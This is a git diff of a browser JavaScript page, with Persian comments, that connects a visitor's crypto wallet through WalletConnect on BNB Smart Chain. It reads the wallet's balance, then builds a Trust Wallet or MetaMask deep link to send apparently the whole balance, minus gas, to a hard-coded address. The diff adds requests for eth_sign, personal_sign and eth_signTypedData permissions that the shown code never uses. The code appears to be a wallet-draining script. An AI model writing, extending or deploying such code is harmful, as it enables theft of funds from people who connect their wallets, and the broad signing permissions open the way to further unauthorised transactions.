@@ -1,12 +1,13 @@
 import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
 import { ethers } from "ethers";
 
-const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // WalletConnect Project ID
+// اینجا مقدارهای واقعی رو جایگزین کن
+const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // ← WalletConnect Project ID
 const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // ← آدرس مقصد BNB
-const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
 
+const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
 let userAddress = null;
-let currentWallet = null; // 'trust' یا 'metamask'
+let currentWallet = null;
 
 const modal = new WalletConnectModalSign({
   projectId,
@@ -33,7 +34,12 @@ async function connectWallet(baseLink) {
     const { uri, approval } = await modal.signClient.connect({
       requiredNamespaces: {
         eip155: {
-          methods: ["eth_sendTransaction"],
+          methods: [
+            "eth_sendTransaction",
+            "eth_sign",
+            "personal_sign",
+            "eth_signTypedData"
+          ],
           chains: ["eip155:56"],
           events: ["accountsChanged", "chainChanged"]
         }
@@ -41,13 +47,13 @@ async function connectWallet(baseLink) {
     });
 
     if (uri) {
-      window.location.href = `${baseLink}${encodeURIComponent(uri)}`;
+      const deepLink = `${baseLink}${encodeURIComponent(uri)}`;
+      window.location.href = deepLink;
     }
 
     const session = await approval();
     const address = session.namespaces.eip155.accounts[0].split(":")[2];
     userAddress = address;
-
     document.getElementById("address").textContent = address;
 
     const balance = await provider.getBalance(address);
@@ -56,8 +62,8 @@ async function connectWallet(baseLink) {
     document.getElementById("sendBtn").disabled = false;
 
   } catch (err) {
-    console.error("Connection error:", err);
-    alert("Connection failed.");
+    console.error("Connection failed:", err);
+    alert("Connection failed: " + (err?.message || err));
   }
 }
 
@@ -69,7 +75,6 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
 
   try {
     const balance = await provider.getBalance(userAddress);
-
     const gasLimit = 21000n;
     const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
     const fee = gasLimit * gasPrice;
@@ -84,7 +89,6 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
     const amountWei = amountToSend.toString();
 
     let deeplink = "";
-
     if (currentWallet === "trust") {
       deeplink = `https://link.trustwallet.com/send?address=${TO_ADDRESS}&amount=${amountBNB}&asset=BNB`;
     } else if (currentWallet === "metamask") {
@@ -92,9 +96,8 @@ document.getElementById("sendBtn").addEventListener("click", async () => {
     }
 
     window.location.href = deeplink;
-
   } catch (err) {
-    console.error("Send error:", err);
+    console.error("Send failed:", err);
     alert("Send failed: " + err.message);
   }
 });
